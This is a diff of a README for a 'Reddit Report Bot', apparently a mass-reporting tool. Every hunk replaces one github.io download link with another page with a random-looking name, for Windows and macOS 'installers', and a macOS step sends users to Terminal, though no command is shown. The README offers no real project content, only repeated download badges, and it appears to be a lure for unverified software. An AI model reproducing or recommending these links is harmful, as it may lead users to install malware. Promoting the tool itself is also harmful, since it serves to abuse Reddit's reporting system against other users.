@@ -27,7 +27,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -60,9 +60,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -75,7 +75,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -106,7 +106,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -131,7 +131,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Reddit_Report_Bot-FF4500?style=for-the-badge&logo=reddit)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
